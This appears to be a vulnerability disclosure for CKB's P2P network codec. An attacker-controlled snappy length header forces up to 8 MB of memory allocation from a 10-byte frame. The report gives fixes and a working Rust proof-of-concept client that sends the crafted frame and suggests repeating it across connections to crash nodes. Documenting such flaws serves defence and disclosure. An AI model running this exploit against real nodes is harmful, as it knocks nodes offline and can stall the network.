### Title
Attacker-Controlled Snappy Decompressed-Length Causes Amplified Memory Allocation in P2P Decoder — (`network/src/compress.rs`)

---

### Summary

The `LengthDelimitedCodecWithCompress::decode` implementation in CKB's P2P network layer allocates a zeroed buffer whose size is taken directly from the attacker-supplied snappy varint header, before any decompression is validated. An unprivileged peer can send a tiny compressed frame (~10 bytes) that claims an 8 MB uncompressed size, forcing an 8 MB heap allocation per message. Repeated across many concurrent connections this exhausts node memory and crashes the process.

---

### Finding Description

`network/src/compress.rs` implements the framing codec used by every CKB P2P protocol. The `Decoder` implementation at lines 219–262 follows this path:

1. `self.length_delimited.decode(src)?` (line 226) — `tokio_util`'s `LengthDelimitedCodec` reads a 4-byte big-endian length prefix and buffers exactly that many bytes. The per-protocol `max_frame_length` cap (e.g. 4 MB for RelayV3, 2 MB for Sync) is enforced here.

2. If the first byte of the buffered frame has `COMPRESS_FLAG` set (line 232), `decompress_len(&data[1..])` (line 233) is called. This reads the **varint-encoded uncompressed length** from the raw snappy stream header — a value entirely under attacker control.

3. The only guard is `decompressed_bytes_len > MAX_UNCOMPRESSED_LEN` (line 235), where `MAX_UNCOMPRESSED_LEN = 1 << 23 = 8 MB` (line 13). Any value ≤ 8 MB passes.

4. Line 242 immediately allocates: `let mut buf = BytesMut::zeroed(decompressed_bytes_len);`

5. `SnapDecoder::new().decompress(…)` then fails because the actual payload does not match the claimed size, the connection is dropped, but the 8 MB allocation has already occurred. [1](#0-0) [2](#0-1) 

The attacker's minimal wire payload is:

```
[4-byte frame length = 6]  [0x80 compress flag]  [varint 0x80 0x80 0x80 0x04 = 8 388 608]  [1 pad byte]
```

10 bytes on the wire → 8 MB heap allocation. Amplification factor ≈ 800 000×.

The codec is wired into every CKB P2P protocol via `CKBProtocol::build`: [3](#0-2) 

Affected protocols and their outer frame caps: [4](#0-3) 

---

### Impact Explanation

Each peer connection can force one 8 MB allocation before being disconnected. With CKB's default inbound peer limit the attacker can hold O(peers × 8 MB) of live allocations simultaneously. Because the attacker can reconnect immediately after disconnection (using multiple IPs or rotating through the peer slot), allocations can be triggered in a tight loop. On a node with limited RAM this causes the OS OOM killer to terminate the `ckb` process, halting block validation and transaction relay — a complete network-level shutdown for that node. Coordinated against multiple nodes it can partition or stall the network.

---

### Likelihood Explanation

The entry point is the public P2P TCP port, reachable by any unprivileged peer. No authentication, no prior state, and no special capability is required. The crafted frame is trivially constructed (10 bytes). The only friction is the per-protocol `max_frame_length` check in the outer `LengthDelimitedCodec`, which the attacker satisfies by sending a frame that is within the limit but whose snappy header claims the maximum decompressed size. This is straightforward to automate.

---

### Recommendation

Replace the pre-allocation pattern with a decompression approach that does not allocate based on the attacker-supplied header value:

1. **Remove the `decompress_len` pre-allocation.** Use `snap::raw::Decoder::decompress_vec` (or decompress into a pre-allocated, size-capped `BytesMut` grown incrementally) so that no allocation is made before actual decompression succeeds.
2. **Alternatively**, cap `decompressed_bytes_len` to the protocol's own `max_frame_length` (not the global `MAX_UNCOMPRESSED_LEN`), since a legitimately compressed message cannot decompress to more than the protocol's maximum uncompressed message size.
3. **Rate-limit or ban peers** that repeatedly trigger `InvalidData` errors on the compressed path. [5](#0-4) 

---

### Proof of Concept

```rust
// Attacker: connect to any CKB P2P port and send one crafted frame.
// Wire format: [4-byte big-endian frame length][compress_flag][snappy varint for 8MB][padding]

use std::io::Write;
use std::net::TcpStream;

fn main() {
    // Replace with target CKB node P2P address
    let mut stream = TcpStream::connect("TARGET:8115").unwrap();

    // snappy raw varint encoding of 8_388_608 (8 MB)
    let varint_8mb: &[u8] = &[0x80, 0x80, 0x80, 0x04];

    // frame body: compress_flag (0x80) + varint + 1 pad byte = 6 bytes
    let frame_body: Vec<u8> = {
        let mut v = vec![0x80u8]; // COMPRESS_FLAG
        v.extend_from_slice(varint_8mb);
        v.push(0x00); // padding so LengthDelimitedCodec sees a complete frame
        v
    };

    // 4-byte big-endian length prefix
    let len = frame_body.len() as u32;
    stream.write_all(&len.to_be_bytes()).unwrap();
    stream.write_all(&frame_body).unwrap();

    // CKB node now allocates BytesMut::zeroed(8_388_608) before failing decompression.
    // Repeat across many connections to exhaust node memory.
    println!("Sent {} bytes, forced 8 MB allocation on target.", 4 + frame_body.len());
}
```

Each invocation forces one 8 MB allocation on the target. Running this in parallel across the node's inbound peer slots (or from multiple IPs) accumulates allocations until OOM.

### Citations

**File:** network/src/compress.rs (L13-13)
```rust
const MAX_UNCOMPRESSED_LEN: usize = 1 << 23; // 8MB
```

**File:** network/src/compress.rs (L232-248)
```rust
                if (data[0] & COMPRESS_FLAG) != 0 {
                    match decompress_len(&data[1..]) {
                        Ok(decompressed_bytes_len) => {
                            if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {
                                debug!(
                                    "The limit for uncompressed bytes len is exceeded. limit: {}, len: {}",
                                    MAX_UNCOMPRESSED_LEN, decompressed_bytes_len
                                );
                                return Err(io::ErrorKind::InvalidData.into());
                            }
                            let mut buf = BytesMut::zeroed(decompressed_bytes_len);
                            match SnapDecoder::new().decompress(&data[1..], &mut buf) {
                                Ok(_) => Ok(Some(buf)),
                                Err(e) => {
                                    debug!("snappy decompress error: {:?}", e);
                                    Err(io::ErrorKind::InvalidData.into())
                                }
```

**File:** network/src/protocols/mod.rs (L280-288)
```rust
            .codec(move || {
                Box::new(LengthDelimitedCodecWithCompress::new(
                    self.compress,
                    length_delimited::Builder::new()
                        .max_frame_length(max_frame_length)
                        .new_codec(),
                    self.id,
                ))
            })
```

**File:** network/src/protocols/support_protocols.rs (L122-137)
```rust
    pub fn max_frame_length(&self) -> usize {
        match self {
            SupportProtocols::Ping => 1024,                   // 1   KB
            SupportProtocols::Discovery => 512 * 1024,        // 512 KB
            SupportProtocols::Identify => 2 * 1024,           // 2   KB
            SupportProtocols::Feeler => 1024,                 // 1   KB
            SupportProtocols::DisconnectMessage => 1024,      // 1   KB
            SupportProtocols::Sync => 2 * 1024 * 1024,        // 2   MB
            SupportProtocols::RelayV3 => 4 * 1024 * 1024,     // 4   MB
            SupportProtocols::Time => 1024,                   // 1   KB
            SupportProtocols::Alert => 128 * 1024,            // 128 KB
            SupportProtocols::LightClient => 2 * 1024 * 1024, // 2 MB
            SupportProtocols::Filter => 2 * 1024 * 1024,      // 2   MB
            SupportProtocols::HolePunching => 512 * 1024,     // 512 KB
        }
    }
```
